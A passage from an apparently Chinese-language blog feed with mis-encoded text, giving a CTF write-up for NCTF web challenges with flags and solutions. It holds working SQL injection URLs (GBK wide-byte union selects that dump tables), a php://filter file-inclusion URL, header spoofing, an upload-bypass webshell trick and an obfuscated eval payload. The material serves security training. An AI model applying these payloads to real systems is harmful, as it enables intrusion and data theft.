src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8B%E5%8D%883.01.40.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸‹åˆ3.01.40"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;####æ™®é€šçš„GETæ³¨å…¥&lt;/p&gt;
&lt;p&gt;è§£æ³•ä¸€ï¼šä½¿ç”¨sqlmap&lt;/p&gt;
&lt;p&gt;1ï¼‰sqlmap -uâ€&lt;a href=&quot;http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&amp;quot;&quot; target=&quot;_bl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>å—äº¬é‚®ç”µCTFé¢˜è§£</title>
    <link href="http://zer0yu.github.io/2017/10/24/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF%E9%A2%98%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2017/10/24/å—äº¬é‚®ç”µCTFé¢˜è§£/</id>
    <published>2017-10-24T08:02:49.000Z</published>
    <updated>2017-10-24T08:05:10.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><p>nctf{flag_admiaanaaaaaaaaaaa}</p><h4 id="phpçš„å¼±ç±»å‹åŠ MD5ç¢°æ’"><a href="#phpçš„å¼±ç±»å‹åŠ MD5ç¢°æ’" class="headerlink" title="phpçš„å¼±ç±»å‹åŠ MD5ç¢°æ’"></a>phpçš„å¼±ç±»å‹åŠ MD5ç¢°æ’</h4><p>é¦–å…ˆè€ƒå¯Ÿpostæäº¤æ•°æ®ï¼Œç„¶åè€ƒå¯Ÿmd5ç¢°æ’ï¼ŒMD5åŠ å¯†QNKCDZ0å¯ä»¥çœ‹åˆ°æ˜¯0exxxxxxxxxä¹‹ç±»çš„å­—ç¬¦ï¼Œä½ åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œmd5åŠ å¯†åæ˜¯0eå¼€å¤´å°±å¥½äº†ã€‚ä¾‹å¦‚ï¼š aabg7XSs</p><p>flag nctf{md5_collision_is_easy}</p><h4 id="ç»•è¿‡é•¿åº¦é™åˆ¶"><a href="#ç»•è¿‡é•¿åº¦é™åˆ¶" class="headerlink" title="ç»•è¿‡é•¿åº¦é™åˆ¶"></a>ç»•è¿‡é•¿åº¦é™åˆ¶</h4><p>è€ƒå¯Ÿhtmlä¸­çš„ä¸€äº›çŸ¥è¯†ï¼Œåœ¨æ­¤ç›´æ¥ç”¨å¼€å‘è€…å·¥å…·ä¿®æ”¹å³å¯</p><p>nctf{follow_me_to_exploit}</p><h4 id="åŸºæœ¬å›¾ç‰‡éšå†™æœ¯"><a href="#åŸºæœ¬å›¾ç‰‡éšå†™æœ¯" class="headerlink" title="åŸºæœ¬å›¾ç‰‡éšå†™æœ¯"></a>åŸºæœ¬å›¾ç‰‡éšå†™æœ¯</h4><p>macosä¸‹ç±»ä¼¼winhexçš„è½¯ä»¶æœ‰<a href="http://ridiculousfish.com/hexfiend/" target="_blank" rel="noopener">http://ridiculousfish.com/hexfiend/</a></p><p>nctf{photo_can_also_hid3_msg}</p><h4 id="æºç åˆ†æè¿›é˜¶"><a href="#æºç åˆ†æè¿›é˜¶" class="headerlink" title="æºç åˆ†æè¿›é˜¶"></a>æºç åˆ†æè¿›é˜¶</h4><p>è®¿é—®è¿æ¥ï¼Œæ²¡çœ‹å‡ºç«¯å€ªï¼Œç›´æ¥ç”¨burpsuiteçš„spideræ¨¡å—çˆ¬äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°404.htmlï¼Œè®¿é—®ä¹‹åæŸ¥çœ‹æºä»£ç ï¼Œè¿›è€Œå‘ç°ç«¯å€ªã€‚</p><p>nctf{this_is_a_fl4g}</p><h4 id="jsçš„AAencode"><a href="#jsçš„AAencode" class="headerlink" title="jsçš„AAencode"></a>jsçš„AAencode</h4><p>å…¶å®å·²ç»æç¤ºæ˜¯AAencodeäº†ï¼Œæƒ³åŠæ³•è§£å¯†å°±è¡Œã€‚æ¯”å¦‚ä½ å¯ä»¥å†<a href="http://tool.isex.ren/aadecode" target="_blank" rel="noopener">http://tool.isex.ren/aadecode</a>è¿™ä¸ªç½‘ç«™è¿›è¡Œè§£å¯†ã€‚æœºå¯†ç»“æœå°±æ˜¯flagï¼ˆæœ‰äººè¯´æµè§ˆå™¨æ‰“å¼€æ˜¯ä¹±ç ï¼Œè¿™æ ·çš„è¯ä½ wgetä¸‹è½½ï¼Œç„¶åè®°äº‹æœ¬æ‰“å¼€å°±è¡Œï¼‰</p><p>alert(â€œnctf{javascript_aaencode}â€)</p><h4 id="å•èº«æ‹¼æ‰‹é€Ÿ"><a href="#å•èº«æ‹¼æ‰‹é€Ÿ" class="headerlink" title="å•èº«æ‹¼æ‰‹é€Ÿ"></a>å•èº«æ‹¼æ‰‹é€Ÿ</h4><p>æˆ‘è§‰å¾—æ˜¯é¢˜ç›®æ²¡æœ‰å‡ºå¥½ï¼Œæˆ‘ç›´æ¥åœ¨burpsuiteä¸­æŠ“åŒ…å°±çœ‹åˆ°äº†flag</p><p>å½“ç„¶ä¹Ÿå¯èƒ½æ˜¯å‡ºå¥½äº†ï¼Œè€ƒå¯Ÿçš„å°±æ˜¯è·³è½¬</p><p>nctf{yougotit_script_now}</p><h4 id="ä½ ä»å“ªé‡Œæ¥"><a href="#ä½ ä»å“ªé‡Œæ¥" class="headerlink" title="ä½ ä»å“ªé‡Œæ¥"></a>ä½ ä»å“ªé‡Œæ¥</h4><p>ä¸€çœ‹å°±çŸ¥é“æ˜¯æ”¹refererï¼Œå› ä¸ºåœ¨httpå¤´ä¸­æ¥æºåœ°å°±æ˜¯è¿™ä¸ªå‚æ•°ï¼Œåœ¨hackbarä¸­ä¿®æ”¹äº†å°±è¡Œã€‚</p><p>nctf{http_referer}</p><h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpfunction CLsI($ZzvSWE) &#123;    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);    &#125;    return $ZzvSWE;&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸ºå¦‚ä¸‹ä»£ç ï¼Œè¿è¡Œå³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function CLsI($ZzvSWE) &#123;</span><br><span class="line"></span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"></span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $ZzvSWE;</span><br><span class="line"></span><br><span class="line">&#125;echo(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</span><br></pre></td></tr></table></figure><p>å…¶å®æˆ‘è§‰å¾—è¿™ä¸ªä¸æ˜¯åœ¨è€ƒä»£ç å®¡è®¡ï¼Œå› ä¸ºä½ echoä¸€ä¸‹å°±æœ‰flagäº†ã€‚ä½†æ˜¯è¿˜æ˜¯è¯´ä¸‹è¿™ä¸ªè§£å¯†ã€‚å…·ä½“å‚è€ƒè¿™ä¸ªæ–‡ç« <a href="https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html" target="_blank" rel="noopener">https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html</a></p><h4 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h4><p>å‚è€ƒå¦‚ä¸‹æ–‡ç« ï¼Œæ„é€ <a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></p><p><a href="http://www.2cto.com/article/201311/258420.html" target="_blank" rel="noopener">http://www.2cto.com/article/201311/258420.html</a></p><p>å®åœ¨ä¸ä¼šæˆ‘ä»¬è¿˜æœ‰å·¥å…·ï¼š<a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">https://github.com/D35m0nd142/LFISuite</a></p><h4 id="å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨"><a href="#å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨" class="headerlink" title="å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨"></a>å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨</h4><p>è€ƒå¯Ÿ302è·³è½¬ï¼š<a href="http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html</a></p><p>åšé¢˜ç”¨burpæŠ“åŒ…æ”¾repeaterå°±è¡Œï¼Œå…¶å®ç”¨curlä¹Ÿå¯ä»¥</p><p>ä¾‹å¦‚æˆ‘ç”¨curlå‘½ä»¤æ¥åšä¸€ä¸‹ï¼Œå…¶å®è¿™ä¸ªæºç ä¹Ÿå¾ˆå¥½çŒœçš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ curl -i http://chinalover.sinaapp.com/web9/index.php</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line"></span><br><span class="line">Server: sae</span><br><span class="line"></span><br><span class="line">Date: Mon, 11 Sep 2017 08:29:53 GMT</span><br><span class="line"></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">flag: nctf&#123;this_is302redirect&#125;</span><br><span class="line"></span><br><span class="line">Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</span><br><span class="line"></span><br><span class="line">Via: 1566</span><br></pre></td></tr></table></figure><h4 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h4><p>æç¤ºäº†æ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥è”æƒ³åˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å¯ä»¥é¡ºåˆ©çš„ä¸‹è½½ç½‘ç«™çš„æºç è¿›è¡Œå®¡è®¡çš„ã€‚æˆ‘ä»¬å…ˆä¸‹è½½download.phpï¼ˆæ–‡ä»¶åæ˜¯base64ç¼–ç çš„ï¼‰ï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªhereiskey.phpï¼Œç»§ç»­ä¸‹è½½å³å¯å¾—åˆ°flag:nctf{download_any_file_666}</p><p>download.phpçš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">include(&quot;hereiskey.php&quot;);</span><br><span class="line"></span><br><span class="line">$url=base64decode($GET[url]);</span><br><span class="line"></span><br><span class="line">if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123;</span><br><span class="line"></span><br><span class="line">$file_size = filesize($url);</span><br><span class="line"></span><br><span class="line">header ( &quot;Pragma: public&quot; );</span><br><span class="line"></span><br><span class="line">header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; );</span><br><span class="line"></span><br><span class="line">header ( &quot;Cache-Control: private&quot;, false );</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Transfer-Encoding: binary&quot; );</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Type:audio/mpeg MP3&quot;);</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Length: &quot; . $file_size);</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Disposition: attachment; filename=&quot;.$url);</span><br><span class="line"></span><br><span class="line">echo(file_get_contents($url));</span><br><span class="line"></span><br><span class="line">exit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">echo &quot;Access Forbidden!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h4><p>çœ‹åˆ°æç¤º0==notï¼Œæœæ–­æŠ“åŒ…æŠŠ0æ”¹æˆ1ï¼Œç„¶åå°±æœ‰äº†flag</p><p>flag:nctf{cookie_is_different_from_session}</p><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>æç¤ºè®©çœ‹robots.txt</p><p>ç„¶åçœ‹åˆ°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpif($GET[id]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $id = intval($GET[id]);  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));  if ($_GET[id]==1024) &#123;      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;  &#125;  else&#123;    echo($query[content]);  &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure><p>å…¶å®åœ¨æ­¤å¤„æ˜¯è€ƒå¯Ÿmysqlä¸­çš„ä¸€ä¸ªç²¾åº¦é—®é¢˜ï¼Œæ¯”å¦‚2014.1è™½ç„¶åœ¨phpä¸­å“¦æŒ‰æ®µä¸ç­‰äº2014ï¼Œä½†æ˜¯å†æŸ¥è¯¢æ—¶ï¼ŒåŠ å…¥mysqlè®¾ç½®idä¸ºæ•´å‹ï¼Œé‚£ä¹ˆ2014.1å°±ä¼šå˜æˆ2014ã€‚</p><p>the flag is:nctf{query_in_mysql}</p><h4 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h4><p>å…¶å®çœ‹åˆ°è¿æ¥å°±çŸ¥é“æ˜¯gbkçš„é—®é¢˜äº†ï¼Œåé¢æç¤ºä¹Ÿæœ‰</p><p>your sql:select id,title from news where id = â€˜2â€™</p><p>gbk_sql_injection</p><p>å…³äºå®½å­—èŠ‚æ³¨å…¥é—®é¢˜å¯ä»¥çœ‹è¿™ä¸ªæ–‡ç« ï¼š</p><p><a href="http://www.91ri.org/8611.html" target="_blank" rel="noopener">http://www.91ri.org/8611.html</a></p><p><a href="https://www.2cto.com/article/201301/182881.html" target="_blank" rel="noopener">https://www.2cto.com/article/201301/182881.html</a></p><p>ä½ å¯ä»¥æ‰‹åŠ¨æ¥åšï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=ÃŸ&apos; union select 1,database() #</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = â€˜é‹â€™ union select 1,database() #â€™</p><p>sae-chinalover</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = â€˜id=é‹â€™ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #â€™</p><p>ctf,ctf2,ctf3,ctf4,news</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = â€˜é‹â€™ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 #â€™</p><p>id,flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(id,0x3a,flag) from ctf4 %23</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = â€˜é‹â€™ union select 1,group_concat(id,0x3a,flag) from ctf4 #â€™</p><p>1:nctf{gbk_3sqli}</p><h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h4><p>çœ‹æ ‡é¢˜å°±çŸ¥é“è¿™ä¸ªæ˜¯åœ¨è€ƒå¯Ÿ00æˆªæ–­</p><p>åˆ†æä¸‹è¿™æ®µä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (isset ($GET[&apos;nctf&apos;])) &#123;        if (@ereg (&quot;^[1-9]+$&quot;, $GET[&apos;nctf&apos;]) === FALSE)            echo &apos;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&apos;;        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)               die(&apos;Flag: &apos;.$flag);        else            echo &apos;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&apos;;    &#125;</span><br></pre></td></tr></table></figure><p>ereg(mode, string subject, array regs);</p><p>modeï¼šæ­£åˆ™è¡¨è¾¾å¼ï¼ˆpreg_matchä¸­çš„modeå¿…é¡»ä»¥â€™/â€˜å¼€å§‹å’Œâ€œ/â€ç»“æŸï¼‰</p><p>subjectï¼š éœ€è¦éªŒè¯çš„å­—ç¬¦ä¸²</p><p>matchs/regsï¼š åŒ¹é…åå¾—åˆ°çš„ç»“æœã€‚ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨</p><p>strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p><p>æ„é€ ï¼š</p><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu</a></p><p>ç½‘ä¸Šä¹Ÿæœ‰è¯´æ„é€ </p><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=</a></p><p>è¿™ä¸ªåŸå› æ˜¯å› ä¸ºæŠ¥é”™å¹¶è¿”å›nullï¼ˆå¤šäºäº†wonderkunå¤§ä½¬ï¼‰</p><h4 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h4><p>è¿™ä¸ªé¢˜è·Ÿä¸Šé¢é‚£ä¸ªæ˜¯ä¸ä¸€æ ·çš„ï¼Œæ³¨æ„æ˜¯===</p><p>æ‰€ä»¥å§¿åŠ¿å¦‚ä¸‹ï¼š<a href="http://www.cnblogs.com/weidiao/p/6821812.html" target="_blank" rel="noopener">http://www.cnblogs.com/weidiao/p/6821812.html</a></p><p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c</a></p><h4 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h4><p>çœ‹ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    extract($_POST);</span><br><span class="line"></span><br><span class="line">    if ($pass == $thepassword_123) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php &#125; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php &#125; ?&gt;</span><br></pre></td></tr></table></figure><p>extract()å‡ºç°çš„é—®é¢˜ï¼Œè¯¦æƒ…è§ï¼š</p><p><a href="http://www.cnblogs.com/sqyysec/p/6926095.html" target="_blank" rel="noopener">http://www.cnblogs.com/sqyysec/p/6926095.html</a></p><p>æ„é€ ï¼š</p><p>pass=1&amp;thepassword_123=1 postæ–¹å¼æäº¤å°±è¡Œï¼ˆä½¿ç”¨hackbarå’Œburpå‡å¯ï¼‰</p><h4 id="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h4><p><a href="http://way.nuptzj.cn/php/index.txt" target="_blank" rel="noopener">http://way.nuptzj.cn/php/index.txt</a>çœ‹åˆ°æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>idçš„å†…å®¹è¦è·ŸhackerDJä¸ç›¸åŒï¼Œä½†æ˜¯urldecodeä¹‹åè¦å’ŒhackerDJç›¸åŒ</p><p>å…¶å®åœ¨æ­¤å¤„è€ƒå¯Ÿçš„æ˜¯$_GET[]æœ¬èº«å°±æœ‰urldecodeçš„åŠŸèƒ½ï¼Œæ‰€ä»¥æ„é€ ï¼š%2568ackerDJå³å¯</p><p>nctf{php_is_best_language}</p><h4 id="ä¼ªè£…è€…"><a href="#ä¼ªè£…è€…" class="headerlink" title="ä¼ªè£…è€…"></a>ä¼ªè£…è€…</h4><p>çœ‹åˆ°è¿™å¥â€œç®¡ç†ç³»ç»Ÿåªèƒ½åœ¨æœ¬åœ°ç™»é™†â€å°±çŸ¥é“äº†</p><p>æŠ“åŒ…å¢åŠ ï¼šX-Forwarded-For: 127.0.0.1</p><p>nctf{happy_http_headers}</p><h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>flagåœ¨å“åº”å¤´ä¸­ï¼Œç”¨burpçœ‹ä¸‹å°±è¡Œ</p><p>nctf{tips_often_hide_here}</p><h4 id="ä¸Šä¼ ç»•è¿‡"><a href="#ä¸Šä¼ ç»•è¿‡" class="headerlink" title="ä¸Šä¼ ç»•è¿‡"></a>ä¸Šä¼ ç»•è¿‡</h4><p>è¿™é¢˜ç½‘ä¸Šå¤§å¤šéƒ½å†™é”™äº†ï¼Œæœ‰å¿…è¦ä¸€å†™ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ä¸Šä¼ 1.pngï¼ˆä½†å®é™…æ–‡ä»¶å†…å®¹å†™çš„æ˜¯phpä¸€å¥è¯ï¼‰</p><p>ä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸æ–‡ä»¶å†…å®¹æ— å…³ã€‚é‡è¦çš„æ˜¯ï¼šæœ€ç»ˆè·¯å¾„æ˜¯æ‹¼æ¥äº† dir å’Œ filename çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ dir å¤„ 00 æˆªæ–­ä¸º .php å³å¯ç»•è¿‡ã€‚</p><p>å…·ä½“çš„æ–¹å¼ä¸ºç”¨burpåœ¨hexä¸­å°†ç©ºæ ¼20ä¿®æ”¹ä¸º00</p><p>nctf{welcome_to_hacks_world}</p><h4 id="SQLæ³¨å…¥1"><a href="#SQLæ³¨å…¥1" class="headerlink" title="SQLæ³¨å…¥1"></a>SQLæ³¨å…¥1</h4><p>çŸ¥é“äº†æ˜¯postæ³¨å…¥ä¹‹åæˆ‘ä»¬çœ‹ä»£ç å°±å¥½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span 